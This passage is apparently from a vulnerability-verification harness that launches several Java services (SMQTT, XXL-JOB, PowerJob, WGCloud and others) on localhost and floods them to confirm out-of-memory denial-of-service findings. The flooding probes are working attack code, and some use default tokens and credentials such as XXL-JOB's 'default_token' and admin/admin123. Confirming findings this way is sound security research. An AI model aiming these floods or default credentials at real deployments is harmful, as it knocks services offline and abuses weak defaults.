        "zeroDateTimeBehavior=convertToNull&characterEncoding=UTF-8&"
        "serverTimezone=Asia/Shanghai&useSSL=false"
    )
    config_path = citrus_runtime_properties(jdbc_url, redis_port)
    app_args = [
        f"--server.port={port}",
        f"--spring.config.additional-location={config_path.as_uri()}",
    ]
    if exclude_mda:
        app_args.append("--spring.autoconfigure.exclude=com.github.yiuman.citrus.mda.autoconfigure.CitrusDdlAutoConfiguration")
    command = spring_boot_command(
        heap,
        citrus_classpath(include_mda=not exclude_mda),
        "com.github.yiuman.citrus.CitrusApplication",
        *app_args,
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}{log_suffix}.log"
    process, handle = start_java(command, log_path, CITRUS_DIR / "citrus-main")
    if not wait_for_http(f"http://127.0.0.1:{port}/rest/verify/captcha", 150, process):
        stop_process(process, handle)
        raise RuntimeError(f"Citrus full environment did not serve /rest/verify/captcha on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_wgcloud(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = spring_boot_command(
        heap,
        wgcloud_classpath(),
        "com.wgcloud.WgcloudServiceApplication",
        f"--server.port={port}",
        f"--spring.datasource.url=jdbc:mysql://127.0.0.1:{mysql_port}/wgcloud?characterEncoding=utf-8&characterSetResults=utf8&autoReconnect=true&useSSL=false&allowMultiQueries=true",
        "--spring.datasource.username=root",
        "--spring.datasource.password=123456",
        "--spring.datasource.hikari.minimumIdle=1",
        "--spring.datasource.hikari.maximumPoolSize=3",
        jvm_args=JAVA_LEGACY_OPENS,
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, WGCLOUD_DIR / "wgcloud-server")
    if not wait_for_http(f"http://127.0.0.1:{port}/wgcloud/login/toLogin", 120, process):
        stop_process(process, handle)
        raise RuntimeError(f"WGCloud did not serve /wgcloud/login/toLogin on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_powerjob(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    jdbc_url = (
        f"jdbc:mysql://127.0.0.1:{mysql_port}/powerjob-daily"
        "?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai"
    )
    command = spring_boot_command(
        heap,
        powerjob_classpath(),
        "tech.powerjob.server.PowerJobServerApplication",
        f"--server.port={port}",
        "--spring.profiles.active=daily",
        "--oms.mongodb.enable=false",
        "--oms.transporter.active.protocols=HTTP",
        "--oms.transporter.main.protocol=HTTP",
        "--oms.http.port=18086",
        f"--spring.datasource.core.jdbc-url={jdbc_url}",
        "--spring.datasource.core.username=root",
        "--spring.datasource.core.password=No1Bug2Please3!",
        "--spring.datasource.core.maximum-pool-size=4",
        "--spring.datasource.core.minimum-idle=1",
        f"--oms.storage.dfs.mysql-series.url={jdbc_url}",
        "--oms.storage.dfs.mysql-series.username=root",
        "--oms.storage.dfs.mysql-series.password=No1Bug2Please3!",
        "--oms.storage.dfs.mysql-series.auto-create-table=true",
        f"--oms.storage.dfs.mysql_series.url={jdbc_url}",
        "--oms.storage.dfs.mysql_series.username=root",
        "--oms.storage.dfs.mysql_series.password=No1Bug2Please3!",
        "--oms.storage.dfs.mysql_series.auto_create_table=true",
        "--spring.mail.host=127.0.0.1",
        "--spring.mail.port=1",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, POWERJOB_DIR)
    if not wait_for_http(f"http://127.0.0.1:{port}/", 150, process):
        stop_process(process, handle)
        raise RuntimeError(f"PowerJob did not serve HTTP on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_dcmp(case: Candidate, heap: str, port: int, mysql_port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = spring_boot_command(
        heap,
        dcmp_classpath(),
        "com.vince.xq.DataCompareApplication",
        f"--server.port={port}",
        f"--spring.datasource.druid.master.url=jdbc:mysql://127.0.0.1:{mysql_port}/dataCompare?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=Asia/Shanghai",
        "--spring.datasource.druid.master.username=root",
        "--spring.datasource.druid.master.password=123456",
        "--spring.datasource.druid.initialSize=1",
        "--spring.datasource.druid.minIdle=1",
        "--spring.datasource.druid.maxActive=4",
        "--server.tomcat.threads.min-spare=4",
        "--server.tomcat.threads.max=32",
        jvm_args=JAVA_LEGACY_OPENS,
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, DCMP_DIR)
    if not wait_for_http(f"http://127.0.0.1:{port}/login", 120, process):
        stop_process(process, handle)
        raise RuntimeError(f"DataCompare did not serve /login on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_ryvf(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    redis_port: int,
) -> tuple[subprocess.Popen[bytes], object, Path]:
    logback_config = ryvf_logback_config()
    command = spring_boot_command(
        heap,
        ryvf_classpath(),
        "com.ruoyi.RuoYiApplication",
        f"--server.port={port}",
        "--spring.profiles.active=druid",
        f"--spring.datasource.druid.master.url=jdbc:mysql://127.0.0.1:{mysql_port}/ry-vue?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=Asia/Shanghai",
        "--spring.datasource.druid.master.username=root",
        "--spring.datasource.druid.master.password=password",
        "--spring.datasource.druid.initialSize=1",
        "--spring.datasource.druid.minIdle=1",
        "--spring.datasource.druid.maxActive=4",
        "--spring.redis.host=127.0.0.1",
        f"--spring.redis.port={redis_port}",
        "--server.tomcat.threads.min-spare=4",
        "--server.tomcat.threads.max=32",
        f"--logging.config={logback_config}",
        jvm_args=(*JAVA_LEGACY_OPENS, f"-Dlogback.configurationFile={logback_config}"),
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, RYVF_DIR)
    if not wait_for_http(f"http://127.0.0.1:{port}/captchaImage", 150, process):
        stop_process(process, handle)
        raise RuntimeError(f"RuoYi-Vue-Fast did not serve /captchaImage on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def start_smartadmin(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    redis_port: int,
) -> tuple[subprocess.Popen[bytes], object, Path]:
    runtime_home = RUNTIME_DIR / "smartadmin-home"
    runtime_home.mkdir(parents=True, exist_ok=True)
    command = spring_boot_command(
        heap,
        smartadmin_classpath(),
        "net.lab1024.sa.admin.AdminApplication",
        f"--server.port={port}",
        "--spring.profiles.active=dev",
        f"--spring.datasource.url=jdbc:p6spy:mysql://127.0.0.1:{mysql_port}/smart_admin_v3?autoReconnect=true&useServerPreparedStmts=false&rewriteBatchedStatements=true&characterEncoding=UTF-8&useSSL=false&allowPublicKeyRetrieval=true&allowMultiQueries=true&serverTimezone=Asia/Shanghai",
        "--spring.datasource.username=root",
        "--spring.datasource.password=SmartAdmin666",
        "--spring.datasource.initial-size=1",
        "--spring.datasource.min-idle=1",
        "--spring.datasource.max-active=4",
        "--spring.datasource.druid.login.enabled=false",
        "--spring.data.redis.host=127.0.0.1",
        f"--spring.data.redis.port={redis_port}",
        "--spring.data.redis.database=1",
        "--smart.job.enabled=false",
        jvm_args=(f"-DlocalPath={runtime_home}",),
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, SMARTADMIN_DIR)
    if not wait_for_http(f"http://127.0.0.1:{port}/login/getCaptcha", 180, process):
        stop_process(process, handle)
        raise RuntimeError(f"SmartAdmin did not serve /login/getCaptcha on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def encode_mqtt_remaining_length(value: int) -> bytes:
    encoded = bytearray()
    while True:
        digit = value % 128
        value //= 128
        if value:
            digit |= 0x80
        encoded.append(digit)
        if not value:
            return bytes(encoded)


def mqtt_string(value: str) -> bytes:
    data = value.encode("utf-8")
    return struct.pack("!H", len(data)) + data


def mqtt_packet(header: int, payload: bytes) -> bytes:
    return bytes([header]) + encode_mqtt_remaining_length(len(payload)) + payload


def mqtt_connect(port: int, client_id: str, clean_session: bool = True) -> socket.socket:
    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    sock.settimeout(5)
    flags = 0x02 if clean_session else 0x00
    payload = mqtt_string("MQTT") + b"\x04" + bytes([flags]) + struct.pack("!H", 60) + mqtt_string(client_id)
    sock.sendall(mqtt_packet(0x10, payload))
    connack = sock.recv(4)
    if len(connack) < 4 or connack[0] != 0x20 or connack[-1] != 0x00:
        sock.close()
        raise RuntimeError(f"unexpected MQTT CONNACK for {client_id!r}: {connack!r}")
    sock.settimeout(0.2)
    return sock


def mqtt_publish(sock: socket.socket, topic: str, payload: bytes, retain: bool = False) -> None:
    header = 0x30 | (0x01 if retain else 0x00)
    sock.sendall(mqtt_packet(header, mqtt_string(topic) + payload))


def mqtt_subscribe(sock: socket.socket, packet_id: int, topic: str, qos: int = 0) -> None:
    variable = struct.pack("!H", packet_id)
    payload = variable + mqtt_string(topic) + bytes([qos])
    sock.sendall(mqtt_packet(0x82, payload))


def mqtt_disconnect(sock: socket.socket) -> None:
    try:
        sock.sendall(b"\xe0\x00")
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def drain_socket(sock: socket.socket) -> None:
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                return
        except (BlockingIOError, socket.timeout):
            return
        except OSError:
            return


def smqtt_config(port: int, case_id: str) -> Path:
    path = RUNTIME_DIR / f"{case_id.lower()}-smqtt.yaml"
    path.write_text(
        "\n".join(
            [
                "smqtt:",
                "  logLevel: INFO",
                "  tcp:",
                f"    port: {port}",
                "    wiretap: false",
                "    bossThreadSize: 1",
                "    workThreadSize: 2",
                "    businessThreadSize: 2",
                "    businessQueueSize: 100000",
                "    messageMaxSize: 4194304",
                "  http:",
                "    enable: false",
                "  ws:",
                "    enable: false",
                "  cluster:",
                "    enable: false",
                "  acl:",
                "    aclPolicy: NONE",
                "",
            ]
        ),
        encoding="utf-8",
    )
    return path


def start_smqtt(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    config_path = smqtt_config(port, case.candidate_id)
    command = [
        "java",
        f"-Xmx{heap}",
        "-cp",
        smqtt_classpath(),
        "io.github.quickmsg.jar.JarStarter",
        config_path.as_posix(),
    ]
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    process, handle = start_java(command, log_path, SMQTT_DIR)
    if not wait_for_port(port, 30):
        stop_process(process, handle)
        raise RuntimeError(f"SMQTT did not listen on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def finish_probe(
    case: Candidate,
    process: subprocess.Popen[bytes],
    handle: object,
    log_path: Path,
    requests_sent: int,
    evidence: dict[str, object],
    notes: str = "",
) -> ProbeResult:
    signal = oom_signal(log_path)
    alive_before_stop = process.poll() is None
    status_values = read_status(process) if alive_before_stop else {}
    if signal:
        status = "verified_oom"
        dynamic_verdict = "confirmed_oom"
        true_positive = True
        time.sleep(1)
    else:
        status = "completed_without_oom" if alive_before_stop else "process_exited_without_oom"
        dynamic_verdict = "not_confirmed"
        true_positive = False
    evidence = {
        **evidence,
        "processExitCode": process.poll(),
        "aliveBeforeStop": alive_before_stop,
        "processStatus": status_values,
    }
    stop_process(process, handle)
    if not signal:
        signal = oom_signal(log_path)
        if signal:
            status = "verified_oom"
            dynamic_verdict = "confirmed_oom"
            true_positive = True
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status=status,
        dynamic_verdict=dynamic_verdict,
        true_positive=true_positive,
        oom_signal=signal,
        requests_sent=requests_sent,
        heap=evidence.get("heap", "unknown"),
        log=rel(log_path),
        evidence=evidence,
        notes=notes,
    )


def manual_probe_result(
    case: Candidate,
    process: subprocess.Popen[bytes],
    handle: object,
    log_path: Path,
    requests_sent: int,
    evidence: dict[str, object],
    status: str,
    dynamic_verdict: str,
    true_positive: bool,
    notes: str,
) -> ProbeResult:
    alive_before_stop = process.poll() is None
    status_values = read_status(process) if alive_before_stop else {}
    evidence = {
        **evidence,
        "processExitCode": process.poll(),
        "aliveBeforeStop": alive_before_stop,
        "processStatus": status_values,
    }
    signal = oom_signal(log_path)
    stop_process(process, handle)
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status=status,
        dynamic_verdict=dynamic_verdict,
        true_positive=true_positive,
        oom_signal=signal,
        requests_sent=requests_sent,
        heap=evidence.get("heap", "unknown"),
        log=rel(log_path),
        evidence=evidence,
        notes=notes,
    )


def run_smqtt_retain(case: Candidate) -> ProbeResult:
    port = 1883
    heap = "96m"
    payload = b"A" * 524288
    process, handle, log_path = start_smqtt(case, heap, port)
    sent = 0
    try:
        sock = mqtt_connect(port, "p0-retain-publisher", clean_session=True)
        try:
            for index in range(1, 401):
                mqtt_publish(sock, f"p0/retain/{index}", payload, retain=True)
                sent = index
                if index % 10 == 0:
                    time.sleep(0.05)
                    if process.poll() is not None or oom_signal(log_path):
                        break
        finally:
            mqtt_disconnect(sock)
    except OSError as exc:
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "payloadBytes": len(payload),
                "estimatedRetainedBytes": sent * len(payload),
                "clientException": repr(exc),
            },
        )
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "payloadBytes": len(payload),
            "estimatedRetainedBytes": sent * len(payload),
            "postProbePortOpen": port_open(port),
        },
    )


def run_smqtt_offline_queue(case: Candidate) -> ProbeResult:
    port = 1883
    heap = "96m"
    topic = "p0/offline/feed"
    payload = b"B" * 524288
    process, handle, log_path = start_smqtt(case, heap, port)
    sent = 0
    try:
        subscriber = mqtt_connect(port, "p0-persistent-offline", clean_session=False)
        mqtt_subscribe(subscriber, 1, topic, qos=0)
        drain_socket(subscriber)
        mqtt_disconnect(subscriber)
        time.sleep(1)
        publisher = mqtt_connect(port, "p0-offline-publisher", clean_session=True)
        try:
            for index in range(1, 401):
                mqtt_publish(publisher, topic, payload, retain=False)
                sent = index
                if index % 10 == 0:
                    time.sleep(0.05)
                    if process.poll() is not None or oom_signal(log_path):
                        break
        finally:
            mqtt_disconnect(publisher)
    except OSError as exc:
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "payloadBytes": len(payload),
                "estimatedQueuedBytes": sent * len(payload),
                "clientException": repr(exc),
            },
        )
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "topic": topic,
            "payloadBytes": len(payload),
            "estimatedQueuedBytes": sent * len(payload),
            "postProbePortOpen": port_open(port),
        },
    )


def run_smqtt_subscriptions(case: Candidate) -> ProbeResult:
    port = 1883
    heap = "96m"
    process, handle, log_path = start_smqtt(case, heap, port)
    sent = 0
    topic_pad = "x" * 640
    try:
        sock = mqtt_connect(port, "p0-subscription-cardinality", clean_session=False)
        try:
            for index in range(1, 140001):
                mqtt_subscribe(sock, (index % 65535) or 1, f"p0/sub/{index}/{topic_pad}", qos=0)
                sent = index
                if index % 100 == 0:
                    drain_socket(sock)
                if index % 1000 == 0:
                    time.sleep(0.02)
                    if process.poll() is not None or oom_signal(log_path):
                        break
        finally:
            mqtt_disconnect(sock)
    except OSError as exc:
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "topicBytesApprox": len(topic_pad) + 16,
                "clientException": repr(exc),
            },
        )
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "topicBytesApprox": len(topic_pad) + 16,
            "postProbePortOpen": port_open(port),
        },
    )


def start_xxl(case: Candidate, heap: str, nproc_limit: int | None = None) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = [
        "java",
        f"-Xmx{heap}",
        "-cp",
        xxl_job_classpath(),
        "com.xxl.job.executor.XxlJobExecutorApplication",
        f"--xxl.job.executor.logpath={RUNTIME_DIR / 'xxl-job-logs'}",
    ]
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    cwd = XXL_JOB_DIR / "xxl-job-executor-samples" / "xxl-job-executor-sample-springboot"
    process, handle = start_java(command, log_path, cwd, nproc_limit=nproc_limit)
    if not wait_for_port(9999, 60):
        stop_process(process, handle)
        raise RuntimeError(f"XXL-JOB executor did not listen on port 9999; see {rel(log_path)}")
    return process, handle, log_path


def post_xxl_trigger(job_id: int, log_id: int, executor_params: str = "") -> int:
    body = {
        "jobId": job_id,
        "executorHandler": "demoJobHandler",
        "executorParams": executor_params,
        "executorBlockStrategy": "SERIAL_EXECUTION",
        "executorTimeout": 0,
        "logId": log_id,
        "logDateTime": int(time.time() * 1000),
        "glueType": "BEAN",
        "glueSource": "",
        "glueUpdatetime": 0,
        "broadcastIndex": 0,
        "broadcastTotal": 1,
    }
    data = json.dumps(body).encode("utf-8")
    request = urllib.request.Request(
        "http://127.0.0.1:9999/trigger",
        data=data,
        headers={
            "Content-Type": "application/json",
            "XXL-JOB-ACCESS-TOKEN": "default_token",
            "XXL-JOB-APPNAME": "xxl-job-executor-sample",
        },
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=5) as response:
        response.read()
        return response.status


def run_xxl_unique_job_threads(case: Candidate) -> ProbeResult:
    heap = "160m"
    user_threads_before = current_user_thread_count()
    nproc_margin = 450
    nproc_limit = user_threads_before + nproc_margin if user_threads_before > 0 else None
    process, handle, log_path = start_xxl(case, heap, nproc_limit=nproc_limit)
    sent = 0
    client_exception = ""
    for index in range(1, 1201):
        try:
            post_xxl_trigger(100000 + index, 200000 + index)
            sent = index
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            client_exception = repr(exc)
            break
        if index % 20 == 0:
            time.sleep(0.05)
            if process.poll() is not None or oom_signal(log_path):
                break
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": 9999,
            "headers": {
                "XXL-JOB-ACCESS-TOKEN": "default_token",
                "XXL-JOB-APPNAME": "xxl-job-executor-sample",
            },
            "userThreadsBeforeStart": user_threads_before,
            "nprocLimit": nproc_limit,
            "nprocMargin": nproc_margin,
            "clientException": client_exception,
        },
    )


def run_xxl_same_job_queue(case: Candidate) -> ProbeResult:
    heap = "128m"
    process, handle, log_path = start_xxl(case, heap)
    sent = 0
    client_exception = ""
    payload = "Q" * 65536
    for index in range(1, 3001):
        try:
            post_xxl_trigger(1, 300000 + index, payload)
            sent = index
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            client_exception = repr(exc)
            break
        if index % 25 == 0:
            time.sleep(0.02)
            if process.poll() is not None or oom_signal(log_path):
                break
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": 9999,
            "executorParamsBytes": len(payload),
            "estimatedQueuedParamBytes": sent * len(payload),
            "clientException": client_exception,
        },
    )


def run_wangmarket_captcha_sessions(case: Candidate) -> ProbeResult:
    port = 18081
    heap = "128m"
    process, handle, log_path = start_wangmarket(case, heap, port)
    sent = 0
    last_status = 0
    last_exception = ""
    set_cookie_count = 0
    for index in range(1, 20001):
        try:
            status, body, headers = http_request(
                f"http://127.0.0.1:{port}/captcha.do?p0={index}",
                headers={"User-Agent": f"p0-wangmarket/{index}"},
                opener=new_cookie_opener(),
                timeout=5,
            )
            last_status = status
            sent = index
            if headers.get("Set-Cookie"):
                set_cookie_count += 1
            if status >= 500 and b"OutOfMemoryError" in body:
                break
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            last_exception = repr(exc)
            break
        if index % 100 == 0:
            time.sleep(0.02)
            if process.poll() is not None or oom_signal(log_path):
                break
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "endpoint": "/captcha.do",
            "setCookieResponses": set_cookie_count,
            "lastHttpStatus": last_status,
            "clientException": last_exception,
            "postProbePortOpen": port_open(port),
        },
    )


def run_citrus_captcha_sessions(case: Candidate) -> ProbeResult:
    port = 18082
    mysql_port = 33312
    redis_port = 36381
    mysql_name = "p0-citrus-mysql"
    redis_name = "p0-citrus-redis"
    heap = "128m"
    mysql_image = ""
    redis_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "yiuman", mysql_version="5.7")
        mysql_import_raw_normalized(mysql_name, "yiuman", CITRUS_DIR / "sql" / "citrus_sys.sql")
        mysql_import_raw_normalized(mysql_name, "yiuman", CITRUS_DIR / "sql" / "data_init.sql")
        redis_image = start_redis_container(redis_name, redis_port)
        startup_mode = "full_mda_autoconfiguration"
        first_startup_error = ""
        try:
            process, handle, log_path = start_citrus_full(
                case,
                heap,
                port,
                mysql_port,
                redis_port,
                log_suffix=".full-startup",
            )
        except RuntimeError as exc:
            first_startup_error = str(exc)
            startup_mode = "mda_autoconfiguration_excluded"
            process, handle, log_path = start_citrus_full(
                case,
                heap,
                port,
                mysql_port,
                redis_port,
                exclude_mda=True,
            )
        sent = 0
        last_status = 0
        last_exception = ""
        set_cookie_count = 0
        for index in range(1, 20001):
            sent = index
            try:
                status, body, headers = http_request(
                    f"http://127.0.0.1:{port}/rest/verify/captcha?p0={index}",
                    headers={"User-Agent": f"p0-citrus/{index}"},
                    opener=new_cookie_opener(),
                    timeout=5,
                )
                last_status = status
                if headers.get("Set-Cookie"):
                    set_cookie_count += 1
                if status >= 500 and b"OutOfMemoryError" in body:
                    break
            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                last_exception = repr(exc)
                break
            if index % 100 == 0:
                time.sleep(0.02)
                if process.poll() is not None or oom_signal(log_path):
                    break
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/rest/verify/captcha",
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
                "setCookieResponses": set_cookie_count,
                "lastHttpStatus": last_status,
                "clientException": last_exception,
                "runtimeOption": "citrus.verify.store=session; citrus.verify.enable=true; spring.datasource.multiples.default mirrors primary datasource",
                "runtimeConfig": rel(RUNTIME_DIR / "citrus-p0.properties"),
                "runtimeClasspathPatch": rel(RUNTIME_DIR / "citrus-classpath-patch"),
                "startupMode": startup_mode,
                "firstStartupError": first_startup_error,
                "postProbePortOpen": port_open(port),
            },
            notes="完整 MySQL/Redis 环境启动，显式使用 session verification store 触发 HttpSession-retained captcha 路径。",
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)
        docker_rm(redis_name)


def run_wgcloud_session_growth(case: Candidate) -> ProbeResult:
    port = 18083
    mysql_port = 33306
    mysql_name = "p0-wgcloud-mysql"
    heap = "128m"
    mysql_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "123456", mysql_version="5.7")
        mysql_import(mysql_name, "123456", "wgcloud", WGCLOUD_DIR / "sql" / "wgcloud-MySQL.sql")
        process, handle, log_path = start_wgcloud(case, heap, port, mysql_port)
        sent = 0
        last_status = 0
        last_exception = ""
        set_cookie_count = 0
        next_index = 0
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, last_exception, set_cookie_count, next_index
            while True:
                with lock:
                    next_index += 1
                    index = next_index
                if index > 120000 or process.poll() is not None or oom_signal(log_path):
                    return
                try:
                    status, body, headers = local_http_request(
                        port,
                        f"/wgcloud/login/toLogin?p0={index}",
                        headers={"User-Agent": f"p0-wgcloud/{worker_id}/{index}"},
                        timeout=5,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                        if headers.get("Set-Cookie"):
                            set_cookie_count += 1
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        last_exception = repr(exc)
                    return

        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(16)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 240
        while time.monotonic() < deadline:
            if process.poll() is not None or oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/wgcloud/login/toLogin",
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "setCookieResponses": set_cookie_count,
                "workerThreads": 16,
                "lastHttpStatus": last_status,
                "clientException": last_exception,
                "postProbePortOpen": port_open(port),
            },
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)


def post_powerjob_body(port: int, payload: bytes, timeout: float = 20) -> tuple[int, bytes, dict[str, str]]:
    return http_request(
        f"http://127.0.0.1:{port}/container/downloadContainerTemplate",
        method="POST",
        data=payload,
        headers={"Content-Type": "application/json"},
        timeout=timeout,
    )


def run_powerjob_body_cache(case: Candidate) -> ProbeResult:
    port = 18084
    mysql_port = 33307
    mysql_name = "p0-powerjob-mysql"
    heap = "192m"
    mysql_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "No1Bug2Please3!", mysql_version="5.7")
        mysql_exec(
            mysql_name,
            "No1Bug2Please3!",
            "CREATE DATABASE IF NOT EXISTS `powerjob-daily` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n",
        )
        process, handle, log_path = start_powerjob(case, heap, port, mysql_port)
        sent = 0
        last_status = 0
        client_exception = ""
        pad = "P" * (16 * 1024 * 1024)
        payload = json.dumps(
            {
                "group": "com.p0",
                "artifact": "probe",
                "name": "Probe",
                "packageName": "com.p0.probe",
                "javaVersion": "17",
                "padding": pad,
            }
        ).encode("utf-8")
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception
            for index in range(1, 25):
                if process is None or process.poll() is not None or oom_signal(log_path):
                    return
                try:
                    status, _, _ = post_powerjob_body(port, payload)
                    with lock:
                        sent += 1
                        last_status = status
                except (urllib.error.URLError, TimeoutError, OSError) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return
                time.sleep(0.02 + (worker_id * 0.002))

        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 180
        while time.monotonic() < deadline:
            if process.poll() is not None or oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/container/downloadContainerTemplate",
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "payloadBytes": len(payload),
                "workerThreads": len(threads),
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbePortOpen": port_open(port),
            },
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)


def dcmp_login(port: int) -> tuple[urllib.request.OpenerDirector, int, str]:
    opener = new_cookie_opener()
    status, body, _ = form_request(
        opener,
        f"http://127.0.0.1:{port}/login",
        {"username": "admin", "password": "admin123", "rememberMe": "false"},
    )
    return opener, status, body.decode("utf-8", errors="replace")[:500]


def run_dcmp_static_map(
    case: Candidate,
    endpoint: str,
    form_builder: Callable[[int], dict[str, object]],
    notes: str,
) -> ProbeResult:
    port = 18085 if case.candidate_id == "DCMP-STATIC-0001" else 18086
    mysql_port = 33308 if case.candidate_id == "DCMP-STATIC-0001" else 33309
    mysql_name = "p0-dcmp-mysql-1" if case.candidate_id == "DCMP-STATIC-0001" else "p0-dcmp-mysql-2"
    heap = "128m"
    mysql_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "123456", mysql_version="5.7")
        mysql_import(mysql_name, "123456", "dataCompare", DCMP_DIR / "sql" / "dataCompare.sql")
        process, handle, log_path = start_dcmp(case, heap, port, mysql_port)
        opener, login_status, login_body = dcmp_login(port)
        sent = 0
        last_status = 0
        last_body = ""
        last_exception = ""
        lock = threading.Lock()
        next_index = 0

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, last_body, last_exception, next_index
            while True:
                with lock:
                    next_index += 1
                    index = next_index
                if index > 160000 or process is None or process.poll() is not None or oom_signal(log_path):
                    return
                try:
                    status, body, _ = form_request(
                        opener,
                        f"http://127.0.0.1:{port}{endpoint}",
                        form_builder(index),
                        timeout=8,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                        if index % 1000 == 0:
                            last_body = body.decode("utf-8", errors="replace")[:500]
